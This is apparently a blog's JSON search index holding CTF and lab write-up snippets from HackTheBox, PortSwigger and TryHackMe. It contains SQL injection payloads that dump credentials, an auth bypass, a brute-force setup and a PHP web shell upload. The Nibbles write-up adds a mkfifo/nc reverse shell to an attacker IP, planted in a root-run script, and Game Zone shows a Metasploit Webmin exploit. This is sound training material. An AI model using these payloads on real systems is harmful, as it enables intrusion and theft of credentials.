dbsadmin 0.000GBconfig 0.000GBlocal 0.000GBsensitive_information 0.000GBusers 0.000GB&gt; use sensitive_informationswitched to db sensitive_information&gt; show collectionsflag&gt; db.flag.find().pretty(){\t\"_id\" : ObjectId(\"630e3dbcb82540ebbd1748c5\"),\t\"flag\" : \"1b6e6fb359e7c40241b6d431427ba6ea\"}" }, { "title": "🔵 HTB - Explosion", "url": "/posts/htb-explosion/", "categories": "HackTheBox, Machines", "tags": "rdp, xfreerdp", "date": "2023-08-01 00:00:00 +0200", "snippet": "ExplosionWhat does the 3-letter acronym RDP stand for?Remote Desktop ProtocolWhat is a 3-letter acronym that refers to interaction with the host through a command line interface?cliWhat about graphical use interactions?guiWhat is the name of an old remote access tool that came without encryption by default and listens on TCP port 23?telnetWhats is the name of the service running on port 3389 TCP?$ nmap -sV -p-...PORT STATE SERVICE VERSION3389/tcp open ms-wbt-server Microsoft Terminal Services...What username successfully returns a desktop projection to us with a blank passwordadministratorSubmit root flag$ xfreerdp /u:administrator /v:hostname...951fa96d7830c451b536be5a6be008a0" }, { "title": "🕸️ PSA - Auth 1 - Username enumeration via different responses", "url": "/posts/psa-auth-1/", "categories": "PortSwigger, Authentication", "tags": "web, auth, bruteforce", "date": "2023-05-23 00:00:00 +0200", "snippet": "Difficulty: Apprentice🎯 GoalThis lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password.To solve the lab, enumerate a valid username, brute-force this user’s password, then access their account page.✅ SolutionFirst let’s try to login with any creds:Log in with wrong credentialsWe can see a message saying “Invalid username”.Let’s look at the query using Burp:username=abc&amp;password=defWe will brute-force the username using a Sniper attack with the provided wordlist.username=§abc§&amp;password=defUsername brute-force resultsSorting the results by response length set one username apart: puppet.If we try it:Log in with good usernameWe have the username, we can repeat the same attack for the password:username=puppet&amp;password=§def§Password brute-force resultsAgain, sorting the results by response length set one password apart: 11111111.Let’s try it on the form:Log in with good credentialsChallenge done ✅" }, { "title": "🕸️ PSA - SQLi 11 - Blind SQLi with conditional responses", "url": "/posts/psa-sqli-11/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli, blind, clusterbomb", "date": "2023-05-17 00:00:00 +0200", "snippet": "Difficulty: Practitioner🎯 GoalThis lab contains a blind SQLi vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.The results of the SQL query are not returned, and no error messages are displayed. But the application includes a “Welcome back” message in the page if the query returns any rows.The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.To solve the lab, log in as the administrator user.✅ SolutionFirst, let’s capture the request into Burp to see what it looks like:GET / HTTP/2Host: &lt;host&gt;Cookie: TrackingId=inef9UVjAF4GJLdj; session=86UdOy9CSRpdDtjDrCqiziIuKdAog6uRCache-Control: max-age=0[...]We know the query behind the TrackingId is vulnerable to blind SQLi and a Welcome back message is displayed when the query returns true.We can test this behaviour with a basic test:TrackingId=inef9UVjAF4GJLdj' AND '1'='1; # Welcome backTrackingId=inef9UVjAF4GJLdj' AND '1'='2; # NothingLet’s be sure there is a users table:TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users LIMIT 1)='a # Welcolme backLet’s be sure there is an administrator user:TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator')='a # Welcolme backBefore guessing the password we have to find its length. I could automate it but usually password aren’t that long :(TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a # Welcome back: password length &gt; 1 charTrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;10)='a # Welcome back: password length &gt; 10 charsTrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;20)='a # Nothing: password length &lt;= 20 charsOk so password is between 10 and 20 chars. Let’s try one by one now.TrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a # Welcome back: password length = 20 charsTrackingId=inef9UVjAF4GJLdj' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=19)='a # Nothing: password length != 19 charsThe password is 20 characters long.Now time to guess the password. Two possibilities: Manually checking every characters at every position (boring) Automate with Burp Intruder to send hundreds of requests for us (cool)Even if we should always automate everything as much as we can I will still present the manual way to show how it is working.1. Manual password guessingWe will have to test one by one every character possible for every position. It’s written the password only includes lowercase alphanumeric characters ([a-z][0-9]) and there are 20 positions (the password length) so it’s a total of 36 * 20 = 720 posibilities…Because it is too much to do manually I will only explain the principle behind: test every character for every position.This query uses the SUBSTRING() function to extract a single character from the password, and test it against a specific value, here a at the position 1. and 9 at the position 20.TrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a # First requestTrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,20,1) FROM users WHERE username='administrator')='9 # Last requestAssuming I successfully sent the 720 requests without errors I should have found the password.2. Automate password guessingI have the Burp Suite Community Edition so I have some feature and throttle limitation but it’s doing the work good.First we have to send the request to the Intruder with ctrl+i.In the Positions tab select Cluster bomb.The payload positions will be the password character position and the character to test, as the following:TrackingId=inef9UVjAF4GJLdj' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§In the Payloads tab: payload set 1 will be Numbers from 1 to 20 step of 1 payload set 2 will be Brute forcer character set abcdefghijklmnopqrstuvwxyz0123456789 min length 1 max length 1 When everything is correctly set we can start the attack. Because the CE edition has a request rate limit of 1 per second it took 10+ minutes to end.We can sort the result responses on their length because the responses with the Welcolme back message will be longuer than those without.Burp Cluster bomb attack resultsWe obtain a table like below revealing the password! 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 5 k y j d q 4 y a q 6 0 q j 6 6 6 7 4 1 We can now log in as the administrator user using the password 5kyjdq4yaq60qj666741." }, { "title": "🕸️ PSA - SQLi 10 - Listing contents on Oracle DB", "url": "/posts/psa-sqli-10/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-05-17 00:00:00 +0200", "snippet": "Difficulty : Practitioner🎯 GoalThis lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.To solve the lab, log in as the administrator user.✅ SolutionFind the number of columns:&lt;website&gt;/filter?category=Gifts'UNION SELECT NULL FROM DUAL-- # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL FROM DUAL-- # works &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL,NULL FROM DUAL-- # error! We know 2 columns are returned by the query. Is one containing string?&lt;website&gt;/filter?category=Gifts'UNION SELECT 'abc',NULL FROM DUAL-- # works&lt;website&gt;/filter?category=Gifts'UNION SELECT 'abc','abc' FROM DUAL-- # worksWe don’t know the name of the table storing the credentials. We have to list all the tables:&lt;website&gt;/filter?category=Gifts'UNION SELECT table_name,NULL FROM all_tables--75 table names are displayed. A quick sort make USERS_OPLMGY stands out. Time to find the column names inside. I didn’t find it first try! I had to look on internet and I found that I have to query the table USER_TAB_COLUMNS.&lt;website&gt;/filter?category=Gifts'UNION SELECT column_name,NULL FROM USER_TAB_COLUMNS WHERE table_name='USERS_OPLMGY'--We obtain USERNAME_JIHLXR and PASSWORD_DNJXFC.&lt;website&gt;/filter?category=Gifts'UNION SELECT USERNAME_JIHLXR,PASSWORD_DNJXFC FROM USERS_OPLMGY--That’s how I solved this challenge!" }, { "title": "🕸️ PSA - SQLi 9 - Listing contents on non-Oracle DB", "url": "/posts/psa-sqli-9/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-05-16 00:00:00 +0200", "snippet": "Difficulty : Practitioner🎯 GoalThis lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response so you can use a UNION attack to retrieve data from other tables.The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.To solve the lab, log in as the administrator user.✅ SolutionFind the number of columns:&lt;website&gt;/filter?category=Gifts'UNION SELECT NULL-- # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL-- # works &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL,NULL-- # error! We know 2 columns are returned by the query. Is one containing string?&lt;website&gt;/filter?category=Gifts'UNION SELECT 'abc',NULL-- # works&lt;website&gt;/filter?category=Gifts'UNION SELECT 'abc','abc'-- # worksWe don’t know the name of the table storing the credentials. We have to list all the tables:&lt;website&gt;/filter?category=Gifts'UNION SELECT table_name,NULL FROM information_schema.columns--179 tables are returned… But after sorting those containing user one stands out: users_ijvpsp.Let’s print the differents columns of the table:&lt;website&gt;/filter?category=Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_ijvpsp'--We obtain 2 columns: username_gifugn and password_zjiaqz.Time to show the passwords!/filter?category=Pets' UNION SELECT username_gifugn, password_zjiaqz FROM users_ijvpsp--Password obtained!" }, { "title": "🕸️ PSA - SQLi 8 - Querying DB type and version on MySQL and Microsoft", "url": "/posts/psa-sqli-8/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-05-16 00:00:00 +0200", "snippet": "Difficulty : Practitioner🎯 GoalTo solve the lab, display the database version string.✅ Solution We know it is a MySQL or Microsoft database so we will have to try different comment symbol:--comment for Microsoft#comment or -- comment for MySQLThe # will be encoded as %23 and the space `` as %20Find the number of columns while trying different comments:# Microsoft: --comment&lt;website&gt;/filter?category=Gifts'UNION SELECT NULL-- # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL-- # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL,NULL-- # error! # MySQL: #comment&lt;website&gt;/filter?category=Gifts'UNION SELECT NULL%23 # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL%23 # works &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL,NULL%23 # error! # MySQL: -- comment&lt;website&gt;/filter?category=Gifts'UNION SELECT NULL--%20 # error! &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL--%20 # works &lt;website&gt;/filter?category=Gifts'UNION SELECT NULL,NULL,NULL--%20 # error! We know 2 columns are returned by the questy. Is one containing string?&lt;website&gt;/filter?category=Gifts'UNION SELECT 'abc',NULL--%20 # works To determine the database type and version on MySQL we have to query @@version.The @ character is %40 when URL encoded.Full payload:&lt;website&gt;/filter?category=Gifts'+UNION+SELECT+%40%40version,NULL--%20 # worksThe database type and version are displayed." }, { "title": "🕸️ PSA - SQLi 7 - UNION attack, querying the database type and version on Oracle", "url": "/posts/psa-sqli-7/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-15 00:00:00 +0100", "snippet": "Difficulty : Practitioner🎯 GoalTo solve the lab, display the Oracle database version string.✅ Solution On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: ' UNION SELECT NULL FROM DUAL--Number of columns:&lt;website&gt;/filter?category=Pets' UNION SELECT NULL FROM DUAL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL FROM DUAL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,NULL FROM DUAL-- # error!Is one column containing string?&lt;website&gt;/filter?category=Pets' UNION SELECT 'abc',NULL FROM DUAL-- # worksFull payload:&lt;website&gt;/filter?category=Pets' UNION SELECT banner,NULL FROM v$version--The database type and version are displayed." }, { "title": "🕸️ PSA - SQLi 6 - UNION attack, retrieving multiple values in a single column", "url": "/posts/psa-sqli-6/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-06 00:00:00 +0100", "snippet": "Difficulty : Practitioner🎯 GoalThe database contains a new table called users, with columns called username and password.To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.✅ SolutionFirst we need to know how many columns are returned by the query:&lt;website&gt;/filter?category=Pets' UNION SELECT NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,NULL-- # error!We now know there are 2 columns. Time to test where is the string data:&lt;website&gt;/filter?category=Pets' UNION SELECT 'abc',NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,'abc'-- # worksOk the second column is a string one. To extract both users and passwords columns we will have to concatenate them into just one columns using the special operator &lt;string&gt; || &lt;string&gt; (can vary according to the DBMS).Let’s try on the full request now:&lt;website&gt;/filter?category=Gifts' UNION SELECT NULL,username || '~' || password FROM users-- # administrator~password" }, { "title": "🕸️ PSA - SQLi 5 - UNION attack, retrieving data from other tables", "url": "/posts/psa-sqli-5/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-06 00:00:00 +0100", "snippet": "Difficulty : Practitioner🎯 GoalThe database contains a new table called users with columns username and password inside.To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.✅ SolutionFirst we need to know how many columns are returned by the query:&lt;website&gt;/filter?category=Pets' UNION SELECT NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,NULL-- # error!We now know there are 2 columns. Time to test if both contain string data:&lt;website&gt;/filter?category=Pets' UNION SELECT 'abc',NULL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT 'abc','abc'-- # worksWe are now sure both columns contain string. We can try to extract the data in users table:&lt;website&gt;/filter?category=Pets' UNION SELECT username, password FROM users--The usernames and passwords are displayed." }, { "title": "🕸️ PSA - SQLi 4 - Finding column containing text", "url": "/posts/psa-sqli-4/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-03 00:00:00 +0100", "snippet": "Difficulty : Practitioner🎯 GoalTo solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided.Value provided: ‘abc’✅ SolutionFirst we need to know how many columns are returned by the query:&lt;website&gt;/filter?category=Pets' UNION SELECT NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,NULL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,NULL,NULL-- # error!We now know there are 3 columns. Time to find which one contains string data:&lt;website&gt;/filter?category=Pets' UNION SELECT 'abc',NULL,NULL-- # error!&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,'abc',NULL-- # works&lt;website&gt;/filter?category=Pets' UNION SELECT NULL,NULL,'abc'-- # error!The second column contains string." }, { "title": "🕸️ PSA - SQLi 3 - UNION attack, determining the number of columns returned by the query", "url": "/posts/psa-sqli-3/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-02 00:00:00 +0100", "snippet": "Difficulty : Practitioner🎯 GoalTo solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.✅ SolutionInitial request:&lt;website&gt;/products?category=GiftsNow we can use 2 technics to determine the number of rows returned:Method 1 - ORDER BY&lt;website&gt;/filter?category=Gifts' ORDER BY 1-- # works&lt;website&gt;/filter?category=Gifts' ORDER BY 2-- # works&lt;website&gt;/filter?category=Gifts' ORDER BY 3-- # works&lt;website&gt;/filter?category=Gifts' ORDER BY 4-- # error!So we know 3 columns are returned.Method 2 - UNION SELECT NULL&lt;website&gt;/filter?category=Gifts' UNION SELECT NULL-- # works&lt;website&gt;/filter?category=Gifts' UNION SELECT NULL,NULL-- # works&lt;website&gt;/filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- # works&lt;website&gt;/filter?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL-- # error!Same result: 3 columns are returned." }, { "title": "🕸️ PSA - SQLi 2 - SQLi Allowing Authentication Bypass", "url": "/posts/psa-sqli-2/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-02 00:00:00 +0100", "snippet": "Difficulty : Apprentice🎯 GoalTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.✅ SolutionIn the Username field of the Login form:administrator'--Anything can be put in the password field:abc" }, { "title": "🕸️ PSA - SQLi 1 - SQLi in WHERE clause", "url": "/posts/psa-sqli-1/", "categories": "PortSwigger, SQLi", "tags": "portswigger, web, sqli", "date": "2023-03-02 00:00:00 +0100", "snippet": "Difficulty : Apprentice🎯 GoalShow all the products no matter the category.✅ SolutionInitial request:&lt;website&gt;/products?category=GiftsWith payload:&lt;website&gt;/products?category='+OR+1=1--" }, { "title": "🟢 HTB - Nibbles", "url": "/posts/htb-nibbles/", "categories": "HackTheBox, Machines", "tags": "gobuster, cewl", "date": "2022-10-02 00:00:00 +0200", "snippet": "Let’s walk through the box Nibbles, an easy-rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges. For this writeup I will say that the IP adresses are the following: attack machine is 10.10.10.1 target machine is 10.10.10.2 EnumerationFirstly let’s do some basic enumeration with nmap.We will begin with a simple quick scan to discover common open ports and service versions:nmap -sV --open 10.10.10.2We quickly see two open ports:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelLet’s start another scan, a full one this time, to be sure to not miss any unusual port:nmap -sV -p- 10.10.10.2While the full scan is running we can check the two known open ports with the defaults nmap scripts:nmap -sC -p 22,80 10.10.10.2Unfortunatly the full scan and the script scan didn’t finish with something useful for us. Now let’s look at the web server we found.Web EnumerationWhen we open firefox on the address there is just one message displayed: Hello world!Checking the page source reveal an interesting comment:&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;A simple web research on Nibbleblog shows that it’s a PHP based blog engine with a well know File Upload Vulnerability which allows an authenticated attacker to upload and execute PHP code on the server. We still don’t know yey which version on Nibbleblog is running this server but it’s still something good to know.Now it’s time to use gobuster to discover hidden directories:gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2Nothing interesting with this scan. Let’s try now to add the directory found in the html comment:gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2/nibbleblog/==========================================================================/.hta (Status: 403) [Size: 302]/.htaccess (Status: 403) [Size: 307]/.htpasswd (Status: 403) [Size: 307]/admin (Status: 301) [Size: 323] [--&gt; http://10.10.10.2/nibbleblog/admin/]/admin.php (Status: 200) [Size: 1401]/content (Status: 301) [Size: 325] [--&gt; http://10.10.10.2/nibbleblog/content/]/index.php (Status: 200) [Size: 2987]/languages (Status: 301) [Size: 327] [--&gt; http://10.10.10.2/nibbleblog/languages/]/plugins (Status: 301) [Size: 325] [--&gt; http://10.10.10.2/nibbleblog/plugins/]/README (Status: 200) [Size: 4628]/themes (Status: 301) [Size: 324] [--&gt; http://10.10.10.2/nibbleblog/themes/]Many directories found here!After looking at each here are the interesting ones for now: admin/ -&gt; Many files here admin.php -&gt; login form content/ -&gt; README/ -&gt; confirm the vulnerable versionCan’t bruteforce login -&gt; error message to blacklist usIn /content/private we find user.xml containing the admin user and we can see some blacklisted addressesNothing seems to leak the password. Finding the word nibbles in many files is worth giving it a try with the admin user.Bingo!Not easy to guess a password like that. HackTheBox advices us to use tools such as CeWL to create custom generated wordlist based on a website.Initial FootholdNow we are logged as admin let’s take time to walk the administration panel.Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.On the configuration page of the My image plugin we can see an upload form. Here we will try to send some PHP code to the server:Firstly let’s try to print the id command by savin the below code into a test.php file and uploading it:&lt;?php system('id'); ?&gt;Now if we cURL the good URL:curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.phpuid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) now let’s upload a reverse shell, inspired by payloadallthethings: &lt;?php system (“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f /bin/sh -i 2&gt;&amp;1 nc 10.10.14.2 9443 &gt;/tmp/f”); ?&gt; setup the nc listener : nc -lvnp 9443 add python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ to upgrade the shell listing files shows user.txt and personal.zip here is the user flag !Privilege Escalation unzip the zip and see a monitor.sh let’s move linpeas.sh to the victim machine python -m http.server 8000 wget 10.10.10.1:8000/linpeas.sh chmod +x linpeas.sh ./linpeas.sh The nibbler user can run the monitor.sh file with root privs and us we can modify the content! So we will append a reverse shell cmd to the end of the file to get root access echo ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f /bin/sh -i 2&gt;&amp;1 nc 10.10.14.2 8443 &gt;/tmp/f’ tee -a monitor.sh nc -lvnp 4445 sudo monitor.sh Here is the root flag !" }, { "title": "🔵 HTB - Dancing", "url": "/posts/htb-dancing/", "categories": "HackTheBox, Machines", "tags": "", "date": "2022-09-26 00:00:00 +0200", "snippet": "⌛" }, { "title": "🔵 HTB - Meow", "url": "/posts/htb-meow/", "categories": "HackTheBox, Machines", "tags": "telnet", "date": "2022-09-22 00:00:00 +0200", "snippet": "What does the acronym VM stand for?Virtual MachineWhat tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.terminalWhat service do we use to form our VPN connection into HTB labs?openvpnWhat tool do we use to test our connection to the target with an ICMP echo request?pingWhat is the name of the most common tool for finding open ports on a target?nmapWhat service do we identify on port 23/tcp during our scans?telnetWhat username is able to log into the target over telnet with a blank password?rootSubmit root flag$ telnet &lt;ip&gt;... █ █ ▐▌ ▄█▄ █ ▄▄▄▄ █▄▄█ ▀▀█ █▀▀ ▐▌▄▀ █ █▀█ █▀█ █▌▄█ ▄▀▀▄ ▀▄▀ █ █ █▄█ █▄▄ ▐█▀▄ █ █ █ █▄▄ █▌▄█ ▀▄▄▀ █▀█Meow login: rootroot@Meow:~# lsflag.txt snaproot@Meow:~# cat flag.txtb40abdfe23665f766f9c61ecba8a4c19" }, { "title": "🔵 HTB - Fawn", "url": "/posts/htb-fawn/", "categories": "HackTheBox, Machines", "tags": "ftp", "date": "2022-09-22 00:00:00 +0200", "snippet": "What does the 3-letter acronym FTP stand for?File Transfer ProtocolWhich port does the FTP service listen on usually?21What acronym is used for the secure version of FTP?SFTPWhat is the command we can use to send an ICMP echo request to test our connection to the target?pingFrom your scans, what version is FTP running on the target?vsftpd 3.0.3From your scans, what OS type is running on the target?UnixWhat is the command we need to run in order to display the ‘ftp’ client help menu?ftp -hWhat is username that is used over FTP when you want to log in without having an account?anonymousWhat is the response code we get for the FTP message ‘Login successful’?230There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.lsWhat is the command used to download the file we found on the FTP server?getSubmit root flag:$ nmap -p- -sV &lt;ip&gt;PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.3Service Info: OS: Unix$ ftp &lt;ip&gt;Connected to &lt;ip&gt;.220 (vsFTPd 3.0.3)Name (&lt;ip&gt;:root): anonymous331 Please specify the password.Password: &lt;blank&gt;230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt226 Directory send OK.ftp&gt; get flag.txtlocal: flag.txt remote: flag.txt200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for flag.txt (32 bytes).226 Transfer complete.32 bytes received in 0.00 secs (151.6990 kB/s)ftp&gt; exit221 Goodbye.$ cat flag.txt 035db21c881520061c53e0536e44f815" }, { "title": "THM - Hack Park", "url": "/posts/thm-hackpark/", "categories": "TryHackMe, Rooms", "tags": "", "date": "2022-08-15 00:00:00 +0200", "snippet": "Coming soon 🚧" }, { "title": "THM - Game Zone", "url": "/posts/thm-gamezone/", "categories": "TryHackMe, Rooms", "tags": "tryhackme, sqli, ssh, privesc, hash, metasploit, cve", "date": "2022-08-15 00:00:00 +0200", "snippet": "4th challenge of the Advanced Exploitation module called Game Zone.On the introduction of the challenge we can read that we will use some SQL injection manually then using SQLMap. Plus we will do some password cracking, manipulating SSH tunnels to reveal a hidden service and use Metasploit to gain root privileges.First thing to do: deploy the machine. For this writeup I will say that the IP adresses are the following: attack machine is 10.10.10.1 target machine is 10.10.10.2 Task #1 - Deploy the vulnerable machineNow the machine is online we can start doing some port enumeration with nmap.We will do a basic scan like:nmap -sC -sV -vv 10.10.10.2 Little explanation of the options : -sC Performs a script scan using the default set of scripts. It is equivalent to –script=default. Some of the scripts in this category are considered intrusive and should not be run against a target network without permission. -sV Enables version detection -vv Max verbosity levelAfter few minutes we can see two interesting running services : Port 80 : http server named ‘Game Zone’ Port 22 : ssh OpenSSH 7.2p2Let’s see the web server first.We can easily identify Hitman on the landing page but I don’t kow his real name. After googling it : What is the name of the large cartoon avatar holding a sniper on the forum? agent 47Task #2 - Obtain access via SQLiSQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:SELECT * FROM users WHERE username = my_password AND password = my_passwordBecause we don’t have a valid username/password pair we will try to bybass the authentication form using SQL injection.In the login field I write username = ' or 1=1 -- -Instead of giving a username and a password to the form I simply escape the username input using the ' because strings are always stored between ' ' or \" \". Then I add the condition or 1=1 and comment all the rest of the query with the double dashes --. In simple words it will say to the database: If 1=1 the user is authenticated. When you’ve logged in, what page do you get redirected to? portal.phpTask #3 - Using SQLMapWe will use SQLMap to dump all the database info.We first have to capture a request within Burp of the search bar in portal.phpYou can put anything you want in the search bar and intercept the request.Copy all the raw body in a text file (req.txt for exemple). To make it works I had to remove all the blank lines of the file except the one before searchitem (the last line)Now we can use SQLMap like thissqlmap -r req.txt --dbms=mysql --dump Where: –r specifies a file containin the request —dbms specifies which Database Management System is used by the website —dump Dump DBMS database table entriesHere it’s said that the dbms is MySQL but in real cases we would have to do some enumeration to identify it.Now we have to wait a moment for SQLMap to finish. If asked to extend the tests for MySQL answer Y. If asked anything else you can answer y.When SQLMap finished we can see 2 tables in the database : users and post.In users SQLMap found just one entry and gave us the hashed password and the username related. In the users table, what is the hashed password? If you followed the steps it should appears on your screen when SQLMap ends. What was the username associated with the hashed password? agent47 What was the other table name? postTask #4 - Cracking a password with JohnTheRipperNow that we have a username and a hashed password we can try to crack the hash to reveal it.for This we will use John The Ripper a 15y old very famous cracking program.The basic command is the following :john @hash --wordlist=@wordlist --format=@format @hash the file containing the hash(es) (hash.txt for exemple) @wordlist the worlist (rockyou.txt for exemple) @format the hash(es) type (md5crypt for exemple) To list all the supported formats by john you can use the following command: john --list=formatsBefore using john we first have to identify the hashtype of the discovered hash.For this there are many websites which can help you finding the type, I personally use Tunnels UP.After finding the good hash format we can now launch john.In few seconds we obtain the password. What is the de-hashed password? if you followed the previous steps john should give it to you very quicklyWe can now try to log into the machine using sshssh agent47@10.10.10.2 What is the user flag?. Just ls and the flag is there.Task #5 - Exposing services with reverse SSH tunnelsNow using a tool called ss we will look at the running sockets on the victim machine.agent47@gamezone:~$ ss -tulnpNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port udp UNCONN 0 0 *:10000 *:* udp UNCONN 0 0 *:68 *:* tcp LISTEN 0 128 *:10000 *:* tcp LISTEN 0 128 *:22 *:* tcp LISTEN 0 80 127.0.0.1:3306 *:* tcp LISTEN 0 128 :::80 :::* tcp LISTEN 0 128 :::22 :::* Here are the detailed options: –t Display TCP sockets –u Display UDP sockets –l Displays only listening sockets –n Doesn’t resolve service names –p Shows the process using the socket How many TCP sockets are running? 5We can identify a service running on port 10000 but can’t be accessed from outside because blocked by a firewall.We will use a ssh tunnel from our mmachine to redirect the traffic of the blocked service to our localhost interface. Thus we will be able to see and interact with the blocked content.ssh -L 10000:localhost:10000 agent47@10.10.10.2firefox localhost:10000 &amp;If it works we should arrive to a login page where you can instantly identify the CMS used. What is the name of the exposed CMS? WebminNow we need to find the credentials to access the admin panel.I first tried admin:admin in the login form but it failed.Then I looked on internet for the default creds and they said it’s the root user (thus the user we are logged in with ssh).When logged in it is not hard to find the CMS version. What is the CMS version? 1.580Tasks #6 - Privilege escalation with MetasploitWe have a CMS name and a version. Now time to look for vulnerabilities.After some researches I found that this server was vulnerable to a CVE : CVE-2012-2982.Let’s play with metasploit.$ msfconsole -qmsf5 &gt; search CVE-2012-2982Matching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/unix/webapp/webmin_show_cgi_exec 2012-09-06 excellent Yes Webmin /file/show.cgi Remote Command Executionmsf5 &gt; use 0msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/unix/reversepayload =&gt; cmd/unix/reversemsf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; show optionsModule options (exploit/unix/webapp/webmin_show_cgi_exec): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD yes Webmin Password Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 10000 yes The target port (TCP) SSL true yes Use SSL USERNAME yes Webmin Username VHOST no HTTP server virtual hostPayload options (cmd/unix/reverse): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Webmin 1.580msf5 exploit(unix/webapp/webmin_show_cgi_exec) &gt; set LHOST 